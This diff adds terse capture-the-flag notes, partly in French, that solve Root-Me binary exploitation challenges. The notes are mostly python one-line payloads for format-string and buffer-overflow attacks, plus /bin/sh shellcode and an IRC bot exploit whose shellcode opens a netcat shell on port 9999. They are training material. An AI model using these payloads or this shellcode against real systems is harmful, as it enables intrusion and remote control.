@@ -1,0 +1,58 @@
+4: /tmp/dossier/invoke.sh ./ch5 $(python -c 'print "\x6c\xfc\xff\xbfaaa" + "%x."*124 + "%s"')
+5:
+print some stuff until override of buffer value, and put correct address;
+ (python -c 'print "abcdefghijklmnopqrstuvwxyzabcdefghijklmo" "\xef\xbe\xad\xde"'; cat ) | ./ch13 
+6: 
+
+objdump to get adress of func callmemaybe, print number of A equal to distance of rsp and buffer, cat to not close new term.
+(python -c 'print "A"*280 + "\xcd\x06\x40\x00\x00\x00"'; cat) | ./ch35
+
+7:
+just write the adress of shell func everywhere until it works
+(python -c 'print "aq"+"\x00\x00\x08\x04\x84\x64"[::-1] * 300'; cat ) | ./ch15
+
+8:
+
+print un shell code pr lancer /bin/sh qui sera stocké au debut du buffer, remplir le buffer pr arriver a 512, puis print ladress de buffer, qui sera stocker dans le pointer golbal.
+
+./ch7 $(python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"+ "A"* 489 + "\x00\x00\x08\x04\xa0\x40"[::-1]')
+
+9;
+check distance entre path et eip ( ebp+4); remplir username avec un truc random, stocker le shellcode dans une var denv, recup ladresse de cette var denv avec du C, mettre cette adress a path + la distance quon a trouvée.
+
+10:
+
+./ch12 & cat /tmp/tmp_file.txt plein de fois jusque ce que ça marche.
+
+11:
+
+create shellcode in env var; get ladresse avec c prog; check ebp+4 pour avoir ladresse de eip a la fin de read data; mettre un -1 au debut du file pour overflow lint; check ladresse de data, calculer distance data et eip,
+ajoute cette distance * \x90 apres le -1, puis ladresse du shellcode;
+python -c 'print "\xff\xff\xff\xff"+ "/" + "\x90"*140 +"\xbf\xff\xfd\x31"[::-1]' > /tmp/ver
+
+12:
+
+meme principe, stocker shellcode dans var denv, cree un file avec ladress du shellcode au bon endroit ( ebp+4 a la fin de cpstr); ça fonctionne pas , car en faisant ça on detruit esi , dont fgets a besoin, du coup on cherche la valeur de esi quand ça crache pas , on lécrit partout a la place des A et cest bon;
+python -c 'print "USERNAME=" + "\x08\x04\xb0\x08"[::-1]*42 + "\xbf\xff\xfd\x31"[::-1]' > /tmp/vvv/lala
+
+13:
+#!/bin/bash 
+(
+echo NICK tsender12
+echo USER tsender12 8 * : Notifier
+sleep 1
+echo 'JOIN #root-me_challenge'
+sleep 1
+echo 'PRIVMSG Pown3dBot' `python -c 'print " :!"+"A"*99 + "\x08\x04\xb1\x21"[::-1]'`
+sleep 1
+echo 'PRIVMSG Pown3dBot' `python -c 'print " :!" + "\xfc\x31\xc9\xf7\xe1\x66\x81\xca\xff\x0f\x42\x6a\x21\x58\x8d\x5a\x04\xcd\x80\x3c\xf2\x74\xee\xb8\x90\x50\x90\x50\x89\xd7\xaf\x75\xe9\xaf\x75\xe6\xff\xe7" +"A"*25 + "PRIVMSG\0"'`
+sleep 1
+echo 'PRIVMSG Pown3dBot' `python -c 'print " :" + "\x90\x50\x90\x50\x90\x50\x90\x50\xeb\x3c\x5e\x31\xc0\x88\x46\x0b\x88\x46\x0e\x88\x46\x16\x88\x46\x26\x88\x46\x2b\x89\x76\x2c\x8d\x5e\x0c\x89\x5e\x30\x8d\x5e\x0f\x89\x5e\x34\x8d\x5e\x17\x89\x5e\x38\x8d\x5e\x27\x89\x5e\x3c\x89\x46\x40\xb0\x0b\x89\xf3\x8d\x4e\x2c\x8d\x56\x40\xcd\x80\xe8\xbf\xff\xff\xff\x2f\x62\x69\x6e\x2f\x6e\x65\x74\x63\x61\x74\x23\x2d\x65\x23\x2f\x62\x69\x6e\x2f\x73\x68\x23\x31\x32\x37\x2e\x31\x32\x37\x2e\x31\x32\x37\x2e\x31\x32\x37\x23\x39\x39\x39\x39\x23\x41\x41\x41\x41\x42\x42\x42\x42\x43\x43\x43\x43\x44\x44\x44\x44\x45\x45\x45\x45\x46\x46\x46\x46"'`
+sleep 1
+) | nc irc.root-me.org 6667
+
+lexploit peut se fair grace a next_param, grace a la condition de fin de boucle. On va donc envoyer de private msg au bot et essayer doverride ses handler. la premier etape est doverride la handler de 376, que lon remplace bah ladresse de buff + 1 ( ! ). Ensuite on place le egghunter dans buff, et remplace la string 376 par PRIVMSG. enfin on stock dans le gros buffer dentrée notre shellcode ( qui ouvre un shell et et transmet tout a nc sur le port 9999). cela va donc appeler PRIVMSG, le handler redirige vers le egghunter, qui lui meme va cherche dans la memoire le shell code grace au marqueur. enfin il faut listant sur le port 9999 pour acceder au nouveau shell ( nc -lvp 9999).
+
+14:
+
+
